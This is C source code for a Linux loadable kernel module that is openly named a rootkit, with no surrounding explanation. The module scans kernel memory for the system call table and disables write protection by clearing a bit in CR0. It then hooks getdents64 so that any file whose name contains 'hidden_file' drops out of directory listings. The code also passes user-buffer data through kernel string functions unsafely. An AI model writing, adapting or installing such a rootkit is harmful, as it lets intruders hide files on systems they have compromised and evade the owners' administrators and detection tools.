#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

unsigned long **sys_call_table;

asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int nread = original_getdents64(fd, dirp, count);
    struct linux_dirent64 *cur = dirp;
    unsigned long offset = 0;

    while (offset < nread) {
        if (strstr(cur->d_name, "hidden_file") != NULL) {
            int reclen = cur->d_reclen;
            memmove(cur, (char *)cur + reclen, nread - offset - reclen);
            nread -= reclen;
            continue;
        }
        offset += cur->d_reclen;
        cur = (struct linux_dirent64 *)((char *)dirp + offset);
    }
    return nread;
}

static unsigned long **find_sys_call_table(void) {
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    for (; offset < ULLONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *)sys_close) {
            return sct;
        }
    }
    return NULL;
}

static int __init rootkit_init(void) {
    sys_call_table = find_sys_call_table();
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

static void __exit rootkit_exit(void) {
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
